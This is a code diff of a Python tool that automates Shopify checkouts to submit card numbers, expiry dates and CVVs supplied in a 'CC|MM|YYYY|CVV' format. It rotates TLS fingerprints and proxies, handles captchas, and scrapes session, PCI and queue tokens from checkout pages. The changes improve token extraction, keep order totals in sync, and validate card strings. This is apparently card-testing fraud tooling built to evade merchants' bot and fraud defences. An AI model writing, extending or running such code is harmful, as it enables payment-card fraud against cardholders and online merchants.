@@ -8,11 +8,10 @@ import json
 import re
 import random
 import sys
-import uuid
-# argparse removed
+# argparse, uuid removed
 from urllib.parse import urlparse
 import tls_requests
-from tls_requests import AsyncClient, ProxyRotator, TLSIdentifierRotator
+from tls_requests import AsyncClient, TLSIdentifierRotator
 # tls-requests (wrapper-tls-requests) is the primary HTTP client.
 # It provides: TLS fingerprint rotation, HTTP/2 fingerprint matching,
 # proxy rotation, and automatic header synchronization (UA + Sec-CH-UA match client_identifier).
@@ -272,22 +271,6 @@ QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){recei
 # tls-requests' client_identifier sets the entire TLS fingerprint (JA3/JA4 hash),
 # cipher suites, ALPN protocols, and certificate verification automatically.
 
-def _get_ssl_connector(verify=True, **kwargs):
-    """Stub for api.py compatibility — no longer used in core.py.
-    
-    api.py imports this for its own aiohttp shared session pool.
-    We keep it as a thin wrapper that returns an aiohttp TCPConnector
-    so api.py doesn't break.
-    """
-    import aiohttp
-    import ssl as _ssl
-    ctx = _ssl.create_default_context()
-    if not verify:
-        ctx.check_hostname = False
-        ctx.verify_mode = _ssl.CERT_NONE
-    return aiohttp.TCPConnector(ssl=ctx, **kwargs)
-
-
 C2C = {
     "USD": "US",
     "CAD": "CA", 
@@ -373,14 +356,6 @@ def pick_addr(url, cc=None, rc=None):
         return book[rc]
 
     return book["DEFAULT"]
-
-def capture(data, first, last):
-    try:
-        start = data.index(first) + len(first)
-        end = data.index(last, start)
-        return data[start:end]
-    except ValueError:
-        return None
 
 def extract_between(text, start, end):
     if not text or not start or not end:
@@ -940,7 +915,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 step_name="checkout", max_retries=2, base_delay=3.0, max_delay=12.0
             )
             # Fallback: some stores reject POST /checkout — try GET
-            if response.status_code in (405, 400, 403) or (response.status_code >= 500):
+            # Note: 400 excluded — could indicate a legitimate cart error, not a method issue
+            if response.status_code in (405, 403) or (response.status_code >= 500):
                 await asyncio.sleep(random.uniform(0.5, 1.5))
                 response, _ = await retry_on_429(
                     lambda: session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15),
@@ -1222,7 +1198,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     # Re-attempt JWT from redirect chain
                     if not _retry_sst and _retry_resp.history:
                         for _rr_url in [str(r.url) for r in _retry_resp.history]:
-                            for _param_name in ['shop_pay_token', 'token', 'checkout_token', 'session_token']:
+                            for _param_name in ['shop_pay_token', 'token', 'checkout_token', 'session_token', 'sst']:
                                 _rr_match = re.search(rf'[?&]{_param_name}=([^&]+)', _rr_url)
                                 if _rr_match:
                                     _rr_jwt = _rr_match.group(1)
@@ -1286,9 +1262,39 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                     if _retry_sst:
                         sst = _retry_sst
-                        # Update checkout_url and text from retry response
                         checkout_url = _retry_url
                         text = _retry_text
+                        # Re-extract page-level variables from retry response
+                        _retry_unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
+                        _retry_build = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', _retry_unescaped)
+                        if _retry_build:
+                            build_id = _retry_build.group(1)
+                        _retry_pci = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
+                        if not _retry_pci:
+                            _retry_pci = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', _retry_unescaped)
+                        if _retry_pci:
+                            pci_build_hash = _retry_pci.group(1)
+                        _retry_src = extract_between(text, 'name="serialized-sourceToken" content="', '"')
+                        if _retry_src:
+                            source_token = _retry_src.replace('&quot;', '').strip('"')
+                        _retry_ident = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', _retry_unescaped)
+                        if _retry_ident:
+                            ident_sig = _retry_ident.group(1)
+                        # Re-extract queueToken and stableId
+                        _retry_qt = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
+                        if not _retry_qt:
+                            _rqt_m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
+                            if _rqt_m:
+                                _retry_qt = _rqt_m.group(1)
+                        if _retry_qt:
+                            queueToken = _retry_qt
+                        _retry_sid = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
+                        if not _retry_sid:
+                            _rsid_m = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
+                            if _rsid_m:
+                                _retry_sid = _rsid_m.group(1)
+                        if _retry_sid:
+                            stableId = _retry_sid
                         print(f"[SESSION_TOKEN] Retry succeeded: {sst[:8]}...", file=sys.stderr)
                 except Exception as _retry_err:
                     _sst_methods_tried.append(f"retry_error:{str(_retry_err)[:40]}")
@@ -1450,6 +1456,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _t_delay = _t_backoff * _t_jitter
                 print(f"[rate-limit] Proposal GraphQL Throttled, retry {_t_attempt+1}/{_throttle_retries} in {_t_delay:.1f}s", file=sys.stderr)
                 await asyncio.sleep(_t_delay)
+                # Sync sst from previous response headers into json_data body before retry
+                if response:
+                    _new_sst_prop = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
+                    if _new_sst_prop and _new_sst_prop != sst:
+                        sst = _new_sst_prop
+                        json_data['variables']['sessionInput']['sessionToken'] = sst
                 response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                 )
@@ -1821,13 +1833,51 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 elif _deliv_result_type == 'NegotiationResultFailed':
                     return False, "Delivery proposal negotiation failed", gateway, total_price, currency
                 elif _deliv_result_type and _deliv_result_type != 'NegotiationResultAvailable':
-                    # Unknown result type — log for debugging but don't crash
                     print(f"[DELIVERY] Unknown result typename: {_deliv_result_type}", file=sys.stderr)
-            except (json.JSONDecodeError, KeyError, TypeError, AttributeError):
-                # If we can't parse the delivery response, let it fall through —
-                # the old behavior was to proceed anyway, and the submit step will
-                # catch the real error. But at least log a warning.
-                print(f"[DELIVERY] Could not validate delivery proposal response, proceeding to PCI vault anyway", file=sys.stderr)
+                
+                # Update running_total, queueToken, tax, checkpoint_data from delivery response
+                # to prevent "Your order total has changed" at submit
+                if _deliv_result and _deliv_result_type == 'NegotiationResultAvailable':
+                    _deliv_qt = _deliv_result.get('queueToken')
+                    if _deliv_qt:
+                        queueToken = _deliv_qt
+                    _deliv_cp = _deliv_result.get('checkpointData')
+                    if _deliv_cp:
+                        checkpoint_data = _deliv_cp
+                    _deliv_seller = _deliv_result.get('sellerProposal')
+                    if _deliv_seller:
+                        _deliv_rt = _deliv_seller.get('runningTotal')
+                        if _deliv_rt and _deliv_rt.get('value'):
+                            running_total = _deliv_rt['value'].get('amount', running_total)
+                            total_price = str(running_total)
+                        _deliv_tax = _deliv_seller.get('tax', {})
+                        if _deliv_tax and _deliv_tax.get('__typename') == 'FilledTaxTerms':
+                            _deliv_tax_amt = _deliv_tax.get('totalTaxAmount', {}).get('value', {}).get('amount')
+                            if _deliv_tax_amt is not None:
+                                try:
+                                    tax_amount = float(_deliv_tax_amt)
+                                except (ValueError, TypeError):
+                                    pass
+                        _deliv_sub = _deliv_seller.get('subtotalBeforeTaxesAndShipping')
+                        if _deliv_sub and _deliv_sub.get('value'):
+                            _deliv_sub_amt = _deliv_sub['value'].get('amount')
+                            if _deliv_sub_amt:
+                                subtotal = str(_deliv_sub_amt)
+                        _deliv_delivery = _deliv_seller.get('delivery')
+                        if _deliv_delivery and _deliv_delivery.get('__typename') == 'FilledDeliveryTerms':
+                            _dd_lines = _deliv_delivery.get('deliveryLines', [])
+                            if _dd_lines:
+                                _dd_strats = _dd_lines[0].get('availableDeliveryStrategies', [])
+                                if _dd_strats:
+                                    delivery_strategy = _dd_strats[0].get('handle', delivery_strategy)
+                                    _dd_ship_amt = _dd_strats[0].get('amount', {}).get('value', {}).get('amount')
+                                    if _dd_ship_amt is not None:
+                                        try:
+                                            shipping_amount = float(_dd_ship_amt)
+                                        except (ValueError, TypeError):
+                                            pass
+            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as _deliv_parse_err:
+                print(f"[DELIVERY] Could not parse delivery response: {_deliv_parse_err}", file=sys.stderr)
 
             payload = {
                 "credit_card": {
@@ -1862,7 +1912,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'sec-ch-ua-wow64': '?0',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
+                'sec-fetch-site': 'cross-site',
                 'sec-fetch-storage-access': 'active',
             }
             if ident_sig:
@@ -2362,8 +2412,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         finally:
             # Always close the session — every checkout creates its own AsyncClient
             try:
-                await session.aclose()
-            except Exception:
+                await asyncio.wait_for(session.aclose(), timeout=5.0)
+            except (asyncio.TimeoutError, Exception):
                 pass
 
     except Exception as e:
@@ -2372,11 +2422,28 @@ def parse_cc_string(cc_string):
     parts = cc_string.split('|')
     if len(parts) != 4:
         raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
+    cc_num = parts[0].strip()
+    mes = parts[1].strip()
+    ano = parts[2].strip()
+    cvv = parts[3].strip()
+    if not cc_num or not re.match(r'^\d{13,19}$', cc_num):
+        raise ValueError(f"Invalid card number: must be 13-19 digits")
+    if not mes or not re.match(r'^\d{1,2}$', mes):
+        raise ValueError(f"Invalid month: must be 1-2 digits")
+    if not ano or not re.match(r'^\d{2,4}$', ano):
+        raise ValueError(f"Invalid year: must be 2 or 4 digits")
+    if not cvv or not re.match(r'^\d{3,4}$', cvv):
+        raise ValueError(f"Invalid CVV: must be 3-4 digits")
+    mes_int = int(mes)
+    if mes_int < 1 or mes_int > 12:
+        raise ValueError(f"Invalid month: {mes} (must be 01-12)")
+    if len(ano) == 2:
+        ano = '20' + ano
     return {
-        'cc': parts[0].strip(),
-        'mes': parts[1].strip(),
-        'ano': parts[2].strip(),
-        'cvv': parts[3].strip()
+        'cc': cc_num,
+        'mes': mes,
+        'ano': ano,
+        'cvv': cvv
     }
 
 async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
